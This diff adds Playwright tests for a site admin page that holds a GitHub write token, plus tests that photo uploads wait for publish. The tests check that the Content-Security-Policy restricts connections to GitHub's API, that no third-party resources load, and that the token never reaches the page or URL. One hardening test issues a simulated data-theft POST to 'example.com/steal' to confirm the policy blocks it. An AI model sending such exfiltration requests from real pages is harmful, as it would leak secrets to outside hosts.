@@ -267,3 +267,153 @@ test.describe('the site reads what the admin writes', () => {
     expect(errors).toEqual([]);
   });
 });
+
+test.describe('hardening', () => {
+  // This page holds a repo-write token. Anything it loads from a third party
+  // could read that token, so it must load nothing from a third party.
+  test('loads no third-party resources at all', async ({ page }) => {
+    const foreign = [];
+    page.on('request', r => {
+      const url = r.url();
+      if (!url.startsWith('http')) return;
+      if (url.includes('127.0.0.1:8080') || url.startsWith('data:') || url.startsWith('blob:')) return;
+      foreign.push(url);
+    });
+    await page.goto('/admin.html');
+    await page.waitForTimeout(900);
+    expect(foreign, 'admin must not fetch anything off-origin before sign-in').toEqual([]);
+  });
+
+  test('declares a policy that pins where data can be sent', async ({ page }) => {
+    await page.goto('/admin.html');
+    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]')
+      .getAttribute('content');
+    expect(csp).toBeTruthy();
+    // Only GitHub's API may be contacted — an injected script has nowhere to post to.
+    expect(csp).toMatch(/connect-src[^;]*https:\/\/api\.github\.com/);
+    expect(csp).toMatch(/default-src\s+'none'/);
+    expect(csp).toMatch(/frame-ancestors\s+'none'/);
+    expect(csp).toMatch(/base-uri\s+'none'/);
+  });
+
+  test('the policy actually blocks an off-origin script', async ({ page }) => {
+    await page.goto('/admin.html');
+    const blocked = await page.evaluate(async () => {
+      try {
+        await fetch('https://example.com/steal', { method: 'POST', body: 'x' });
+        return false;          // request went through - policy is not enforcing
+      } catch (e) {
+        return true;           // blocked
+      }
+    });
+    expect(blocked, 'CSP should stop the page contacting anywhere but GitHub').toBe(true);
+  });
+
+  test('the token is never written into the page or the URL', async ({ page }) => {
+    await stubGitHub(page);
+    await signIn(page);
+    const html = await page.content();
+    expect(html).not.toContain('github_pat_pretend');
+    expect(page.url()).not.toContain('github_pat');
+  });
+});
+
+test.describe('photos wait for publish', () => {
+  test.beforeEach(async ({ page }) => {
+    await stubGitHub(page);
+    await signIn(page);
+  });
+
+  const onePixel = {
+    name: 'porch.png',
+    mimeType: 'image/png',
+    // 1x1 PNG
+    buffer: Buffer.from(
+      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
+      'base64'),
+  };
+
+  test('a chosen photo is prepared locally, not uploaded yet', async ({ page }) => {
+    const uploads = [];
+    await page.route(/api\.github\.com\/repos\/.+\/contents\/assets\/.*/, route => {
+      uploads.push(route.request().url());
+      route.fulfill({ status: 200, contentType: 'application/json',
+        body: JSON.stringify({ content: { sha: 'x' } }) });
+    });
+
+    await page.locator('[data-edit="the-llano-cg"]').click();
+    await page.locator('#photoInput').setInputFiles(onePixel);
+    await expect(page.locator('#photoLog')).toContainText(/upload when you press Publish/i);
+
+    expect(uploads, 'nothing should have been sent to GitHub yet').toEqual([]);
+    await expect(page.locator('#photoGrid figure')).toHaveCount(1);
+    await expect(page.locator('#photoGrid .pending')).toContainText(/Not published/i);
+  });
+
+  test('the card shows how many photos are still unpublished', async ({ page }) => {
+    await page.locator('[data-edit="the-llano-cg"]').click();
+    await page.locator('#photoInput').setInputFiles(onePixel);
+    await page.locator('#dlgSave').click();
+    await expect(page.locator('#dirtyNote')).toContainText(/1 photo not yet uploaded/i);
+    await expect(page.locator('#panel-homes .pending')).toContainText(/1 not yet published/i);
+  });
+
+  test('publishing uploads the photo before the listing file', async ({ page }) => {
+    const order = [];
+    await page.route(/api\.github\.com\/repos\/.+\/contents\/.*/, route => {
+      const url = route.request().url();
+      if (route.request().method() === 'PUT') {
+        order.push(url.includes('/assets/') ? 'photo' : 'data');
+        return route.fulfill({ status: 200, contentType: 'application/json',
+          body: JSON.stringify({ content: { sha: 'newsha' } }) });
+      }
+      route.fulfill({ status: 200, contentType: 'application/json',
+        body: JSON.stringify({ sha: 'oldsha', content: b64(JSON.stringify(SAMPLE)) }) });
+    });
+
+    await page.locator('[data-edit="the-llano-cg"]').click();
+    await page.locator('#photoInput').setInputFiles(onePixel);
+    await page.locator('#dlgSave').click();
+    await page.locator('#publish').click();
+
+    await expect(page.locator('#log')).toContainText(/Published/i);
+    expect(order).toEqual(['photo', 'data']);
+    await expect(page.locator('#panel-homes .pending')).toHaveCount(0);
+  });
+
+  test('a failed photo upload leaves the listing file untouched', async ({ page }) => {
+    let dataWritten = false;
+    await page.route(/api\.github\.com\/repos\/.+\/contents\/.*/, route => {
+      const url = route.request().url();
+      if (route.request().method() === 'PUT') {
+        if (url.includes('/assets/')) {
+          return route.fulfill({ status: 500, contentType: 'application/json',
+            body: JSON.stringify({ message: 'upload exploded' }) });
+        }
+        dataWritten = true;
+        return route.fulfill({ status: 200, contentType: 'application/json',
+          body: JSON.stringify({ content: { sha: 'newsha' } }) });
+      }
+      route.fulfill({ status: 200, contentType: 'application/json',
+        body: JSON.stringify({ sha: 'oldsha', content: b64(JSON.stringify(SAMPLE)) }) });
+    });
+
+    await page.locator('[data-edit="the-llano-cg"]').click();
+    await page.locator('#photoInput').setInputFiles(onePixel);
+    await page.locator('#dlgSave').click();
+    await page.locator('#publish').click();
+
+    await expect(page.locator('#log')).toContainText(/Could not publish/i);
+    expect(dataWritten, 'the site must not point at a photo that never uploaded').toBe(false);
+    await expect(page.locator('#publish')).toBeEnabled();
+  });
+
+  test('removing a prepared photo drops it without contacting GitHub', async ({ page }) => {
+    await page.locator('[data-edit="the-llano-cg"]').click();
+    await page.locator('#photoInput').setInputFiles(onePixel);
+    await expect(page.locator('#photoGrid figure')).toHaveCount(1);
+    await page.locator('[data-drop="0"]').click();
+    await expect(page.locator('#photoGrid figure')).toHaveCount(0);
+    await expect(page.locator('#publish')).toBeDisabled();
+  });
+});
